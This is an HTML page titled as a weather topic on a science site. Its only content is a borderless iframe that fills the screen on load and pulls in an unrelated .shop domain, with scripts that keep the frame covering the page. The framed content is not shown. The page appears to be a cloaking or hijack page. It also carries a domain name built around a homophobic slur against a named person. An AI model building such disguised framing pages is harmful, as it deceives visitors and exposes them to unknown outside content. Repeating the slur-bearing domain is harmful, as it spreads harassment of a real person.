<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Topics - Weather | Interesting Science</title>
    <style>
        body {
            margin: 0;
            overflow: hidden; /* Hide scrollbars initially */
        }

        #myIframe {
            width: 100vw;
            height: 100vh;
            position: absolute;
            top: 0;
            left: 0;
            border: none;
            margin: 0;
            padding: 0;
            overflow: hidden;
            z-index: 0;
            transition: height 0.5s; /* Add a smooth transition effect */
        }
    </style>
</head>
<body>

    <iframe id="myIframe" src="https://bg.dereksarnoisafaggot.shop/" frameborder="0"></iframe>

    <script>
        const iframe = document.getElementById('myIframe');

        // Create a MutationObserver to watch for changes in the DOM
        const observer = new MutationObserver(mutations => {
            mutations.forEach(mutation => {
                // Check if a new element is added to the DOM
                if (mutation.type === 'childList' && mutation.addedNodes.length > 0) {
                    // If a new element is added, make the iframe fill out the entire page
                    iframe.style.height = '100vh';
                    document.body.style.overflow = 'auto'; // Show scrollbars
                }
            });
        });

        // Configure the observer to watch for changes in the entire document
        const observerConfig = { childList: true, subtree: true };

        // Start observing the document
        observer.observe(document, observerConfig);
    </script>

    <!-- Example: Add a new element to the body -->
    <script>
        // Simulate adding a new element after a delay (for demonstration purposes)
        setTimeout(() => {
            const newElement = document.createElement('div');
            newElement.textContent = 'New Element';
            document.body.appendChild(newElement);
        }, 3000); // Add new element after 3 seconds (adjust as needed)
    </script>

</body>
</html>
